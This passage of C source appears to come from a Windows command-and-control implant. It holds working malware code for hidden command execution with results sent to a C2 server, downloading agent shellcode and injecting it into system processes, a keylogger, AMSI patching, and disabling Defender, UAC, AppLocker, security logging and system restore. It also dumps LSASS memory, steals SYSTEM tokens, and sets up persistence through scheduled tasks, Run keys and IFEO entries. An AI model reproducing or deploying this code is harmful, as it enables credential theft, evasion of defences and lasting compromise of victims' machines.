        STARTUPINFOA _si2; lt_zero(&_si2,sizeof(_si2));
        _si2.cb=(DWORD)sizeof(_si2); _si2.dwFlags=STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
        _si2.hStdOutput=_hW2; _si2.hStdError=_hW2; _si2.wShowWindow=SW_HIDE;
        BOOL _sp2=CreateProcessA(NULL,cmdline,NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&_si2,&pi);
        CloseHandle(_hW2);
        if(!_sp2){CloseHandle(_hR2);*outlen=0;return NULL;}
        hR=_hR2;
    }

    /*
     * Non-blocking drain loop: PeekNamedPipe tells us how many bytes are ready
     * so ReadFile never blocks.  WaitForSingleObject(proc,0) checks exit without
     * blocking.  This prevents hanging on commands that spawn an interactive shell
     * (e.g. "cmd") — those never close the write end of the pipe, so the old
     * blocking ReadFile loop would wait forever.  LT_CMD_TIMEOUT_MS hard deadline
     * kills the child and lets the agent return to polling.
     */
    PBYTE buf=NULL; DWORD total=0; BYTE tmp[4096]; DWORD rd;
    {
        DWORD t0=GetTickCount(); int fini=0;
        while(!fini){
            DWORD av=0;
            while(PeekNamedPipe(hR,NULL,0,NULL,&av,NULL)&&av>0){
                DWORD chunk=av<sizeof(tmp)?av:(DWORD)sizeof(tmp);
                if(!ReadFile(hR,tmp,chunk,&rd,NULL)||rd==0){fini=1;break;}
                PBYTE nb=(PBYTE)HeapAlloc(GetProcessHeap(),0,total+rd+2);
                if(!nb){fini=1;break;}
                if(buf){for(DWORD k=0;k<total;k++) nb[k]=buf[k];HeapFree(GetProcessHeap(),0,buf);}
                for(DWORD k=0;k<rd;k++) nb[total+k]=tmp[k];
                total+=rd; buf=nb; av=0;
            }
            if(fini) break;
            if(WaitForSingleObject(pi.hProcess,0)==WAIT_OBJECT_0) break;
            if(GetTickCount()-t0>=LT_CMD_TIMEOUT_MS){
                TerminateProcess(pi.hProcess,1);
                WaitForSingleObject(pi.hProcess,2000);
                break;
            }
            Sleep(50);
        }
        /* Final blocking drain: process is fully dead, write end closed, safe to block */
        while(ReadFile(hR,tmp,sizeof(tmp),&rd,NULL)&&rd>0){
            PBYTE nb=(PBYTE)HeapAlloc(GetProcessHeap(),0,total+rd+2);
            if(!nb) break;
            if(buf){for(DWORD k=0;k<total;k++) nb[k]=buf[k];HeapFree(GetProcessHeap(),0,buf);}
            for(DWORD k=0;k<rd;k++) nb[total+k]=tmp[k];
            total+=rd; buf=nb;
        }
    }
    CloseHandle(hR);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);

    if(!buf||total==0){
        if(buf) HeapFree(GetProcessHeap(),0,buf);
        buf=(PBYTE)HeapAlloc(GetProcessHeap(),0,4);
        if(buf){buf[0]='O';buf[1]='K';buf[2]=0;} total=2;
    }
    *outlen=total; return buf;
}

/*
 * Process migration: download fresh agent shellcode from C2 server, inject
 * into a target process (user-specified or priority pool) to keep the session
 * alive after the current host process is killed or sacrificed.
 *
 * The agent SC is served at {cb_path}/c2/agent-sc in .enc format so the
 * existing POLY_HTTPGET two-layer decoder can handle it without extra logic.
 *
 * Migration priority (when no target is given or injection fails):
 *   svchost → RuntimeBroker → explorer → dllhost → sihost → ctfmon → spoolsv
 *   → SearchHost.  Falls back to POLY_SPAWNinject if all existing pids fail.
 */
static BOOL POLY_MIGRATE(const char *target_narrow) {
    /* Build SC fetch URL: {cb_path}/c2/agent-sc */
    char sc_url[512];
    lt_build_url(sc_url,LT_C2_HTTPS,LT_C2_HOST,LT_C2_PORT,LT_C2_CB_PATH);
    lt_strcat(sc_url,"/c2/agent-sc");

    SIZE_T sclen=0;
    PBYTE sc=POLY_HTTPGET(sc_url,&sclen);
    if(!sc||!sclen) return FALSE;

    BOOL ok=FALSE;

    /* Try the user-supplied process name first */
    if(target_narrow&&target_narrow[0]){
        WCHAR wtgt[128]={0};
        int i=0;
        while(target_narrow[i]&&i<127){wtgt[i]=(WCHAR)(unsigned char)target_narrow[i];i++;}
        DWORD tpid=POLY_FINDPID(wtgt);
        if(tpid) ok=POLY_INJECT(tpid,sc,sclen);
    }

    /* Walk priority pool */
    if(!ok){
        static const WCHAR *_p[]={
            L"svchost.exe",L"RuntimeBroker.exe",L"explorer.exe",
            L"dllhost.exe",L"sihost.exe",L"ctfmon.exe",
            L"spoolsv.exe",L"SearchHost.exe",NULL
        };
        for(int i=0;_p[i]&&!ok;i++){
            DWORD pid=POLY_FINDPID(_p[i]);
            if(pid) ok=POLY_INJECT(pid,sc,sclen);
        }
    }

    /* Last resort: spawn-inject */
    if(!ok) ok=POLY_SPAWNinject(sc,sclen);

    lt_zero(sc,sclen);
    HeapFree(GetProcessHeap(),0,sc);
    return ok;
}

/*
 * Task 5 — Automatic watchdog / failover migration.
 *
 * On agent startup, immediately inject a copy of the agent SC into a secondary
 * process (highest-priority pool member that accepts injection). This acts as an
 * "insurance" agent: if the primary host is killed by AV, the secondary session
 * keeps the engagement alive without requiring manual operator intervention.
 *
 * The secondary agent runs independently — it will register with C2 as a new
 * session. The operator can identify it by its different session_id.
 */
/*
 * Task 14 — Anti-tamper watchdog in a sacrificial process.
 *
 * The old watchdog was a thread inside the agent process — if Falcon kills the
 * parent process, the thread dies with it.
 *
 * New approach:
 *   1. Agent creates a named mutex whose lifetime is tied to the agent process.
 *   2. We inject the agent SC into a SECONDARY process immediately (no delay).
 *   3. The secondary agent has its own watchdog, injecting into a THIRD process.
 *   4. Meanwhile this thread loops, re-injecting whenever our mutex disappears
 *      (parent process died) or on a 2-minute heartbeat to keep the chain alive.
 *
 * The SECONDARY agent survives the primary being killed because it runs in its
 * own address space.  The loop in THIS thread ensures any gap is healed within
 * one heartbeat cycle.
 */
static WCHAR _lt_wdog_mutex[64]={0};  /* set by POLY_AGENT on startup */

static DWORD WINAPI POLY_WATCHDOG_THREAD(PVOID param) {
    /* Immediate injection — no startup delay, so coverage begins right away */
    char sc_url[512];
    lt_build_url(sc_url,LT_C2_HTTPS,LT_C2_HOST,LT_C2_PORT,LT_C2_CB_PATH);
    lt_strcat(sc_url,"/c2/agent-sc");
    /* DO NOT call _lt_recrypt_cfg() here — the main POLY_AGENT thread already did so
     * after building its own URLs.  A second recrypt in this concurrent thread would
     * race with the main loop's _lt_decode_cfg() calls, double-XOR the config arrays,
     * and corrupt the user-agent string mid-connection → WinHTTP drops requests. */

    static const WCHAR *_wdog_pool[]={
        L"svchost.exe",L"RuntimeBroker.exe",L"dllhost.exe",
        L"sihost.exe",L"ctfmon.exe",NULL
    };

    /* Heartbeat loop — sleep first, then inject.
     * Sleeping first prevents the immediate-injection cascade where each new
     * agent spawns another agent instantly, flooding the server with sessions. */
    for(;;){
        /* Wait ~2 minutes or until the agent named mutex disappears */
        if(_lt_wdog_mutex[0]){
            HANDLE hMtx=OpenMutexW(SYNCHRONIZE,FALSE,_lt_wdog_mutex);
            if(!hMtx){
                /* Agent mutex gone — re-inject soon, but not instantly */
                POLY_NTDELAY(10000LL*10000LL);
            } else {
                CloseHandle(hMtx);
                POLY_NTDELAY(120000LL*10000LL);
            }
        } else {
            POLY_NTDELAY(120000LL*10000LL);
        }

        /* Inject backup agent into a secondary process */
        SIZE_T sclen=0;
        PBYTE sc=POLY_HTTPGET(sc_url,&sclen);
        if(sc&&sclen){
            for(int i=0;_wdog_pool[i];i++){
                DWORD pid=POLY_FINDPID(_wdog_pool[i]);
                if(pid&&POLY_INJECT(pid,sc,sclen)) break;
            }
            lt_zero(sc,sclen);
            HeapFree(GetProcessHeap(),0,sc);
        }
    }
    return 0;
}

/*
 * Task 10 — Concurrent task execution.
 * The agent now executes commands on background threads rather than blocking the
 * poll loop.  Long-running operations (SharpHound, network scans, etc.) no longer
 * freeze the REPL — the operator can queue additional commands while waiting.
 *
 * Slot lifecycle:  0 = free  →  1 = running  →  2 = result ready  →  0 (after POST)
 */
#define LT_MAX_CONCURRENT 4

typedef struct {
    char            task_id[17];
    char            session_id[17]; /* copy of agent session_id for result JSON */
    char            result_url[512];/* pre-built POST URL so worker can reply immediately */
    char            cmd[4096];
    PBYTE           output;
    DWORD           out_len;
    volatile LONG   state;   /* 0=free, 1=running, 2=done */
} _LT_SLOT;

static _LT_SLOT _lt_slots[LT_MAX_CONCURRENT];

/* Dynamic sleep interval — operator-controlled via "sleep <ms>" command.
 * Default: midpoint of the compile-time jitter range. */
static volatile DWORD _lt_sleep_base_ms = LT_C2_JITTER_MIN + (LT_C2_JITTER_MAX - LT_C2_JITTER_MIN) / 2;

/* ── Keylogger state ─────────────────────────────────────────────────────── */
#define LT_KLOG_CAP 65536
static volatile LONG  _lt_klog_run    = 0;  /* 1 = running */
static volatile DWORD _lt_klog_used   = 0;
static char          *_lt_klog_buf    = NULL;
static HANDLE         _lt_klog_thread = NULL;

static const char _lt_vk_map[256] = {
    0,0,0,0,0,0,0,0,'\b','\t',0,0,0,'\n',0,0,  /* 0x00-0x0F */
    0,0,0,0,0,0,0,0,0,0,0,27,0,0,0,0,           /* 0x10-0x1F */
    ' ',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,          /* 0x20-0x2F */
    '0','1','2','3','4','5','6','7','8','9',      /* 0x30-0x39 */
    0,0,0,0,0,0,0,
    'a','b','c','d','e','f','g','h','i','j','k','l','m', /* 0x41-0x4D */
    'n','o','p','q','r','s','t','u','v','w','x','y','z', /* 0x4E-0x5A */
};

static DWORD WINAPI _lt_klog_thread_fn(PVOID p) {
    (void)p;
    SHORT prev[256]={0};
    while(InterlockedCompareExchange(&_lt_klog_run,1,1)==1){
        for(int vk=0x08;vk<=0x5A;vk++){
            SHORT st=GetAsyncKeyState(vk);
            if((st&1)&&!(prev[vk]&1)&&_lt_klog_buf&&_lt_klog_used<LT_KLOG_CAP-4){
                char c=_lt_vk_map[vk];
                if(c){
                    if(c=='\b'&&_lt_klog_used>0){_lt_klog_used--;} /* backspace */
                    else if(c=='\n'){_lt_klog_buf[_lt_klog_used++]='\\';_lt_klog_buf[_lt_klog_used++]='n';}
                    else _lt_klog_buf[_lt_klog_used++]=c;
                }
            }
            prev[vk]=st;
        }
        Sleep(10);
    }
    return 0;
}

static DWORD WINAPI POLY_TASK_THREAD(PVOID param) {
    _LT_SLOT *sl = (_LT_SLOT*)param;
    /* delegate execution — POLY_EXECMD tries direct path first (Task 1) */
    sl->output = POLY_EXECMD(sl->cmd, &sl->out_len);
    InterlockedExchange(&sl->state, 2);
    return 0;
}

static int _lt_alloc_slot(void) {
    for(int i=0;i<LT_MAX_CONCURRENT;i++)
        if(InterlockedCompareExchange(&_lt_slots[i].state,1,0)==0) return i;
    return -1;
}

/*
 * C2 agent mode: polls the Lilith server for shell commands, executes them
 * via cmd.exe, exfils output through the existing HTTPS callback channel.
 *
 * Protocol:
 *   Register : POST {cb_path}/c2/register   body=telemetry JSON with session_id
 *              ← {"key": N}  (N = session XOR key, 1-254 odd)
 *
 *   Poll     : GET  {cb_path}/{session_id}/task
 *              ← empty = no task
 *              ← raw bytes: [key_byte][task_id_16chars]['|'][command...]  (all XOR'd)
 *
 *   Result   : POST {cb_path}/{session_id}/{task_id}   body=telemetry JSON
 */
/* ═══════════════════════════════════════════════════════════════════════════
 * CHURCH phase bypass: defense-defeat, anti-forensics, persistence, creds.
 * Based on CHURCH (ek0ms savi0r) — adapted for nostdlib x64 shellcode build.
 * Orchestrated by _lt_church_phase(), called once at POLY_AGENT startup.
 * ═══════════════════════════════════════════════════════════════════════════ */

/* Spawn process hidden, wait up to wait_ms (0 = detached/no wait) */
static void _lt_spawn_hidden(LPCWSTR exe, LPWSTR cmd, DWORD wait_ms) {
    STARTUPINFOW si; PROCESS_INFORMATION pi;
    lt_zero(&si,sizeof(si)); lt_zero(&pi,sizeof(pi)); si.cb=sizeof(si);
    if(CreateProcessW(exe,cmd,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi)){
        if(wait_ms&&pi.hProcess) WaitForSingleObject(pi.hProcess,wait_ms);
        if(pi.hProcess) CloseHandle(pi.hProcess);
        if(pi.hThread)  CloseHandle(pi.hThread);
    }
}

/* Run: powershell.exe -NonInteractive -Command "..." (fire-and-forget) */
static void _lt_ps(LPCWSTR cmd) {
    WCHAR buf[2048]; int i=0;
    static const WCHAR _hd[]={
        L'p',L'o',L'w',L'e',L'r',L's',L'h',L'e',L'l',L'l',L'.',L'e',L'x',L'e',
        L' ',L'-',L'N',L'o',L'n',L'I',L'n',L't',L'e',L'r',L'a',L'c',L't',L'i',L'v',L'e',
        L' ',L'-',L'C',L'o',L'm',L'm',L'a',L'n',L'd',L' ',L'"',0};
    for(int j=0;_hd[j];j++) buf[i++]=_hd[j];
    for(int j=0;cmd[j]&&i<2044;j++) buf[i++]=cmd[j];
    buf[i++]=L'"'; buf[i]=0;
    _lt_spawn_hidden(NULL,buf,0);
}

/* Grant SeDebugPrivilege to current process token */
static void _lt_enable_debug(void) {
    HANDLE hTok=NULL;
    if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hTok)) return;
    TOKEN_PRIVILEGES tp; LUID luid;
    if(LookupPrivilegeValueW(NULL,L"SeDebugPrivilege",&luid)){
        tp.PrivilegeCount=1; tp.Privileges[0].Luid=luid;
        tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hTok,FALSE,&tp,sizeof(tp),NULL,NULL);
    }
    CloseHandle(hTok);
}

/* Phase 0: patch AmsiScanBuffer / AmsiScanString / AmsiOpenSession → xor rax,rax; ret */
static void _lt_patch_amsi(void) {
    static const char _adll[]={'a','m','s','i','.','d','l','l',0};
    HMODULE hA=(HMODULE)GetModuleHandleA(_adll);
    if(!hA) hA=LoadLibraryA(_adll);
    if(!hA) return;
    static const char *_fns[]={"AmsiScanBuffer","AmsiScanString","AmsiOpenSession",NULL};
    for(int i=0;_fns[i];i++){
        PBYTE p=(PBYTE)GetProcAddress(hA,_fns[i]);
        if(!p) continue;
        DWORD old=0;
        VirtualProtect(p,8,PAGE_EXECUTE_READWRITE,&old);
        p[0]=0x48; p[1]=0x31; p[2]=0xC0; p[3]=0xC3; /* xor rax,rax; ret */
        VirtualProtect(p,8,old,&old);
        FlushInstructionCache(GetCurrentProcess(),p,8);
    }
}

/* Phase 1a: disable Defender TamperProtection via registry + PS fallback */
static void _lt_disable_tamper(void) {
    HKEY hk=NULL;
    if(RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            L"SOFTWARE\\Microsoft\\Windows Defender\\Features",
            0,KEY_SET_VALUE,&hk)==ERROR_SUCCESS){
        DWORD z=4;
        RegSetValueExW(hk,L"TamperProtection",0,REG_DWORD,(BYTE*)&z,sizeof(z));
        RegCloseKey(hk);
    }
    _lt_ps(L"Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features'"
           L" -Name TamperProtection -Value 4 -Force -ErrorAction SilentlyContinue");
}

/* Phase 1b: kill Defender processes */
static void _lt_kill_defender_procs(void) {
    static const WCHAR *_t[]={
        L"MsMpEng.exe",L"NisSrv.exe",L"MpCmdRun.exe",
        L"SecurityHealthService.exe",L"MsMpEngCP.exe",NULL};
    for(int i=0;_t[i];i++){
        DWORD pid=POLY_FINDPID(_t[i]);
        if(!pid) continue;
        HANDLE hp=OpenProcess(PROCESS_TERMINATE,FALSE,pid);
        if(hp){ TerminateProcess(hp,0); CloseHandle(hp); }
    }
}

/* Phase 1c: Set-MpPreference batch + stop WinDefend/WdNisSvc */
static void _lt_disable_defender(void) {
    static const WCHAR *_cmds[]={
        L"Set-MpPreference -DisableRealtimeMonitoring $true",
        L"Set-MpPreference -DisableBehaviorMonitoring $true",
        L"Set-MpPreference -DisableScriptScanning $true",
        L"Set-MpPreference -DisableIOAVProtection $true",
        L"Set-MpPreference -DisableBlockAtFirstSeen $true",
        L"Set-MpPreference -MAPSReporting 0",
        L"Set-MpPreference -CloudBlockLevel 0",
        L"Set-MpPreference -SubmitSamplesConsent 2",
        L"Set-MpPreference -DisableIntrusionPreventionSystem $true",
        L"Set-MpPreference -DisableCatchupFullScan $true",
        L"Set-MpPreference -DisableCatchupQuickScan $true",
        L"Set-MpPreference -HighThreatDefaultAction 6 -Force",
        L"Set-MpPreference -SevereThreatDefaultAction 6 -Force",
        NULL
    };
    for(int i=0;_cmds[i];i++) _lt_ps(_cmds[i]);
    SC_HANDLE scm=OpenSCManagerW(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    if(!scm) return;
    static const WCHAR *_sv[]={L"WinDefend",L"WdNisSvc",NULL};
    for(int i=0;_sv[i];i++){
        SC_HANDLE svc=OpenServiceW(scm,_sv[i],SERVICE_STOP|SERVICE_CHANGE_CONFIG);
        if(svc){
            SERVICE_STATUS ss; ControlService(svc,SERVICE_CONTROL_STOP,&ss);
            ChangeServiceConfigW(svc,SERVICE_NO_CHANGE,SERVICE_DISABLED,
                SERVICE_NO_CHANGE,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
            CloseServiceHandle(svc);
        }
    }
    CloseServiceHandle(scm);
}

/* Phase 1d: EnableLUA = 0 (UAC off) */
static void _lt_disable_uac(void) {
    HKEY hk=NULL; DWORD z=0;
    if(RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
            0,KEY_SET_VALUE,&hk)!=ERROR_SUCCESS) return;
    RegSetValueExW(hk,L"EnableLUA",0,REG_DWORD,(BYTE*)&z,sizeof(z));
    RegSetValueExW(hk,L"ConsentPromptBehaviorAdmin",0,REG_DWORD,(BYTE*)&z,sizeof(z));
    RegSetValueExW(hk,L"PromptOnSecureDesktop",0,REG_DWORD,(BYTE*)&z,sizeof(z));
    RegCloseKey(hk);
}

/* Phase 1e: stop AppIDSvc, delete SiPolicy.p7b, zero DeviceGuard key */
static void _lt_disable_applocker(void) {
    SC_HANDLE scm=OpenSCManagerW(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    if(scm){
        SC_HANDLE svc=OpenServiceW(scm,L"AppIDSvc",SERVICE_STOP|SERVICE_CHANGE_CONFIG);
        if(svc){
            SERVICE_STATUS ss; ControlService(svc,SERVICE_CONTROL_STOP,&ss);
            ChangeServiceConfigW(svc,SERVICE_NO_CHANGE,SERVICE_DISABLED,
                SERVICE_NO_CHANGE,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
            CloseServiceHandle(svc);
        }
        CloseServiceHandle(scm);
    }
    DeleteFileW(L"C:\\Windows\\System32\\CodeIntegrity\\SiPolicy.p7b");
    HKEY hk=NULL; DWORD disp=0; DWORD z=0;
    if(RegCreateKeyExW(HKEY_LOCAL_MACHINE,
            L"SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\SystemGuard",
            0,NULL,REG_OPTION_NON_VOLATILE,KEY_SET_VALUE,NULL,&hk,&disp)==ERROR_SUCCESS){
        RegSetValueExW(hk,L"Enabled",0,REG_DWORD,(BYTE*)&z,sizeof(z));
        RegCloseKey(hk);
    }
}

/* Phase 1f: Add-MpPreference exclusions for current exe + C:\ */
static void _lt_add_defender_exclusions(void) {
    WCHAR exe[MAX_PATH]; GetModuleFileNameW(NULL,exe,MAX_PATH);
    WCHAR buf[512]; int i=0;
    static const WCHAR _pfx[]=L"Add-MpPreference -ExclusionPath '";
    for(int j=0;_pfx[j];j++) buf[i++]=_pfx[j];
    for(int j=0;exe[j]&&i<490;j++) buf[i++]=exe[j];
    buf[i++]=L'\''; buf[i]=0;
    _lt_ps(buf);
    _lt_ps(L"Add-MpPreference -ExclusionPath 'C:\\'");
    _lt_ps(L"Add-MpPreference -ExclusionPath 'C:\\Windows\\Temp'");
    _lt_ps(L"Add-MpPreference -ExclusionExtension '.exe'");
}

/* Phase 2a: MiniNt key → disables security event generation; zero LSA audit */
static void _lt_disable_security_logs(void) {
    HKEY hk=NULL; DWORD disp=0; DWORD one=1; DWORD z=0;
    if(RegCreateKeyExW(HKEY_LOCAL_MACHINE,
            L"SYSTEM\\CurrentControlSet\\Control\\MiniNt",
            0,NULL,REG_OPTION_NON_VOLATILE,KEY_SET_VALUE,NULL,&hk,&disp)==ERROR_SUCCESS){
        RegSetValueExW(hk,NULL,0,REG_DWORD,(BYTE*)&one,sizeof(one));
        RegCloseKey(hk);
    }
    if(RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            L"SYSTEM\\CurrentControlSet\\Control\\Lsa",
            0,KEY_SET_VALUE,&hk)==ERROR_SUCCESS){
        RegSetValueExW(hk,L"auditbaseobjects",0,REG_DWORD,(BYTE*)&z,sizeof(z));
        RegCloseKey(hk);
    }
}

/* Phase 2b: Disable-ComputerRestore + DisableSR/DisableConfig registry */
static void _lt_disable_system_restore(void) {
    _lt_ps(L"Disable-ComputerRestore -Drive 'C:\\' -ErrorAction SilentlyContinue");
    HKEY hk=NULL; DWORD disp=0; DWORD one=1;
    if(RegCreateKeyExW(HKEY_LOCAL_MACHINE,
            L"SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore",
            0,NULL,REG_OPTION_NON_VOLATILE,KEY_SET_VALUE,NULL,&hk,&disp)==ERROR_SUCCESS){
        RegSetValueExW(hk,L"DisableSR",0,REG_DWORD,(BYTE*)&one,sizeof(one));
        RegSetValueExW(hk,L"DisableConfig",0,REG_DWORD,(BYTE*)&one,sizeof(one));
        RegCloseKey(hk);
    }
}

/* Phase 2c: append telemetry domain sinks to %WINDIR%\System32\drivers\etc\hosts */
static void _lt_drop_telemetry(void) {
    WCHAR hp[MAX_PATH]; UINT n=GetSystemDirectoryW(hp,480);
    if(!n) return;
    /* append \drivers\etc\hosts — 18 chars including null */
    static const WCHAR _suf[]={L'\\',L'd',L'r',L'i',L'v',L'e',L'r',L's',
        L'\\',L'e',L't',L'c',L'\\',L'h',L'o',L's',L't',L's',0};
    for(int i=0;_suf[i];i++) hp[n+i]=_suf[i]; hp[n+18]=0;
    HANDLE hf=CreateFileW(hp,FILE_APPEND_DATA,FILE_SHARE_READ,
        NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    if(hf==INVALID_HANDLE_VALUE) return;
    static const char *_dom[]={
        "telemetry.microsoft.com","vortex-win.data.microsoft.com",
        "settings-win.data.microsoft.com","watson.telemetry.microsoft.com",
        "vortex.data.microsoft.com","oca.telemetry.microsoft.com",
        "df.telemetry.microsoft.com","reports.wes.df.telemetry.microsoft.com",NULL};
    for(int i=0;_dom[i];i++){
        char line[256]; int li=0;
        const char *z="0.0.0.0 "; while(*z) line[li++]=*z++;
        for(int j=0;_dom[i][j]&&li<248;j++) line[li++]=_dom[i][j];
        line[li++]='\r'; line[li++]='\n';
        DWORD w=0; WriteFile(hf,line,li,&w,NULL);
    }
    CloseHandle(hf);
}

/* Phase 4: stop and disable 11 security services */
static void _lt_stop_security_svcs(void) {
    static const WCHAR *_sv[]={
        L"Sense",L"SgrmBroker",L"WdBoot",L"WdFilter",L"WdNisDrv",
        L"WinDefend",L"SecurityHealthService",L"wscsvc",
        L"BITS",L"wuauserv",L"MicrosoftUpdate",NULL};
    SC_HANDLE scm=OpenSCManagerW(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    if(!scm) return;
    for(int i=0;_sv[i];i++){
        SC_HANDLE svc=OpenServiceW(scm,_sv[i],
            SERVICE_STOP|SERVICE_QUERY_STATUS|SERVICE_CHANGE_CONFIG);
        if(svc){
            SERVICE_STATUS ss; ControlService(svc,SERVICE_CONTROL_STOP,&ss);
            ChangeServiceConfigW(svc,SERVICE_NO_CHANGE,SERVICE_DISABLED,
                SERVICE_NO_CHANGE,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
            CloseServiceHandle(svc);
        }
    }
    CloseServiceHandle(scm);
}

/* Phase 5: MiniDumpWriteDump(lsass) → C:\Windows\Temp\diag_ppl.log (hidden+system) */
typedef BOOL (WINAPI *_pMDD)(HANDLE,DWORD,HANDLE,DWORD,PVOID,PVOID,PVOID);
static void _lt_dump_lsass(void) {
    _lt_enable_debug();
    static const WCHAR _ls[]=L"lsass.exe";
    DWORD lpid=POLY_FINDPID(_ls);
    if(!lpid) return;
    HANDLE hP=OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,lpid);
    if(!hP) return;
    HANDLE hF=CreateFileW(L"C:\\Windows\\Temp\\diag_ppl.log",GENERIC_WRITE,0,NULL,
        CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM,NULL);
    if(hF!=INVALID_HANDLE_VALUE){
        static const char _dbg[]={'d','b','g','h','e','l','p','.','d','l','l',0};
        static const char _fn[] ={'M','i','n','i','D','u','m','p','W','r','i','t','e','D','u','m','p',0};
        HMODULE hDbg=LoadLibraryA(_dbg);
        if(hDbg){
            _pMDD fn=(_pMDD)GetProcAddress(hDbg,_fn);
            /* 0x00061907 = WithFullMemory|UnloadedModules|ProcessThreadData|FullMemoryInfo|ThreadInfo */
            if(fn) fn(hP,lpid,hF,0x00061907,NULL,NULL,NULL);
        }
        CloseHandle(hF);
    }
    CloseHandle(hP);
}

/* Phase 7a: PPL elevation via SeTcbPrivilege + NtSetInformationProcess(0x3D) */
typedef NTSTATUS (NTAPI *_pNtSIP)(HANDLE,DWORD,PVOID,ULONG);
typedef struct { UCHAR Level; } _LT_PSP;
static void _lt_enable_ppl(void) {
    HANDLE hTok=NULL;
    if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hTok)) return;
    TOKEN_PRIVILEGES tp; LUID luid;
    if(LookupPrivilegeValueW(NULL,L"SeTcbPrivilege",&luid)){
        tp.PrivilegeCount=1; tp.Privileges[0].Luid=luid;
        tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hTok,FALSE,&tp,sizeof(tp),NULL,NULL);
        static const char _ntd[]={'n','t','d','l','l','.','d','l','l',0};
        static const char _sip[]={'N','t','S','e','t','I','n','f','o','r','m','a','t','i','o','n','P','r','o','c','e','s','s',0};
        _pNtSIP fnSIP=(_pNtSIP)GetProcAddress(GetModuleHandleA(_ntd),_sip);
        if(fnSIP){ _LT_PSP prot; prot.Level=0x72;
            fnSIP(GetCurrentProcess(),0x3D,&prot,sizeof(prot)); }
    }
    CloseHandle(hTok);
}

/* Phase 7b: steal SYSTEM token from lsass via DuplicateTokenEx + ImpersonateLoggedOnUser */
static void _lt_token_steal(void) {
    _lt_enable_debug();
    static const WCHAR _ls[]=L"lsass.exe";
    DWORD lpid=POLY_FINDPID(_ls);
    if(!lpid) return;
    HANDLE hP=OpenProcess(PROCESS_QUERY_INFORMATION,FALSE,lpid);
    if(!hP) return;
    HANDLE hTok=NULL,hDup=NULL;
    if(OpenProcessToken(hP,TOKEN_DUPLICATE|TOKEN_IMPERSONATE,&hTok)){
        DuplicateTokenEx(hTok,TOKEN_ALL_ACCESS,NULL,SecurityImpersonation,TokenPrimary,&hDup);
        if(hDup){ ImpersonateLoggedOnUser(hDup); CloseHandle(hDup); }
        CloseHandle(hTok);
    }
    CloseHandle(hP);
}

/* Phase 3a: schtask(onlogon/SYSTEM) + HKCU Run key + IFEO + SilentProcessExit */
static void _lt_add_persistence(void) {
    WCHAR exe[MAX_PATH]; GetModuleFileNameW(NULL,exe,MAX_PATH);
    /* Scheduled task */
    WCHAR tc[1024]; int ti=0;
    static const WCHAR _p1[]=L"schtasks.exe /create /tn \"WindowsUpdateTask\" /tr \"";
    for(int j=0;_p1[j];j++) tc[ti++]=_p1[j];
    for(int j=0;exe[j]&&ti<900;j++) tc[ti++]=exe[j];
    static const WCHAR _p2[]=L"\" /sc onlogon /ru SYSTEM /f";
    for(int j=0;_p2[j];j++) tc[ti++]=_p2[j]; tc[ti]=0;
    _lt_spawn_hidden(L"C:\\Windows\\System32\\schtasks.exe",tc,2000);
    /* HKCU Run key */
    HKEY hk=NULL; DWORD disp=0;
    if(RegCreateKeyExW(HKEY_CURRENT_USER,
            L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            0,NULL,REG_OPTION_NON_VOLATILE,KEY_SET_VALUE,NULL,&hk,&disp)==ERROR_SUCCESS){
        RegSetValueExW(hk,L"WindowsUpdate",0,REG_SZ,
            (BYTE*)exe,(DWORD)((lstrlenW(exe)+1)*sizeof(WCHAR)));
        RegCloseKey(hk);
    }
    /* IFEO Debugger: svchost.exe */
    if(RegCreateKeyExW(HKEY_LOCAL_MACHINE,
            L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
            L"\\Image File Execution Options\\svchost.exe",
            0,NULL,REG_OPTION_NON_VOLATILE,KEY_SET_VALUE,NULL,&hk,&disp)==ERROR_SUCCESS){
        RegSetValueExW(hk,L"Debugger",0,REG_SZ,
            (BYTE*)exe,(DWORD)((lstrlenW(exe)+1)*sizeof(WCHAR)));
        RegCloseKey(hk);
    }
    /* Silent Process Exit monitor: relaunches binary when svchost.exe exits */
    if(RegCreateKeyExW(HKEY_LOCAL_MACHINE,
            L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
            L"\\SilentProcessExit\\svchost.exe",
            0,NULL,REG_OPTION_NON_VOLATILE,KEY_SET_VALUE,NULL,&hk,&disp)==ERROR_SUCCESS){
        DWORD flags=0x2;
        RegSetValueExW(hk,L"MitigationOptions",0,REG_BINARY,(BYTE*)&flags,sizeof(flags));
        RegSetValueExW(hk,L"MonitorProcess",0,REG_SZ,
            (BYTE*)exe,(DWORD)((lstrlenW(exe)+1)*sizeof(WCHAR)));
        RegCloseKey(hk);
    }
}

/* Phase 3b: WMI event subscription — trigger on explorer.exe start */
static void _lt_wmi_persist(void) {
